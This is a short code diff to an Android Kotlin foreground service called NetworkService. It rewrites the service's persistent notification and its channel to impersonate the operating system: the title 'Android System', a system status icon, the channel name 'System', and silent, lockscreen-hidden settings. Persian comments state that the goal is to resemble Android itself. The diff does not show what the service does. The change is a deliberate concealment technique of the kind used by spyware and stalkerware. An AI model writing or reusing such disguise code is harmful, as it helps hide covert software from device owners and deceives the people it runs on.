@@ -96,13 +96,15 @@ class NetworkService : Service() {
         createNotificationChannel()
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")
-            .setContentText("")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setContentTitle("Android System")  // ⭐ شبیه سیستم Android
+            .setContentText("Checking network...")
+            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)  // آیکون شبکه
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setShowWhen(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setSilent(true)
             .build()
 
         startForeground(NOTIFICATION_ID, notification)
@@ -113,14 +115,15 @@ class NetworkService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Network Monitoring",
+                "System",  // ⭐ فقط "System"
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Monitoring network status"
+                description = "System services"
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
                 setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
 
             val manager = getSystemService(NotificationManager::class.java)
